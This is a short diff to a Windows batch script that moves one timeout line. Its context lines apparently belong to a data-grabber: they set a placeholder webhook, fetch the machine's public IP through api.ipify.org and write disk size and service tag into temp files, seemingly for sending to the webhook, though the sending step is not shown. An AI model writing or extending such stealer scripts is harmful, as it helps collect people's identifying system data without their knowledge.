@@ -1,8 +1,8 @@
 @echo off
 cd /D "%~dp0%"
+timeout 2 > nul
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
-timeout 2 > nul
 echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
 wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
 echo Service Tag: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
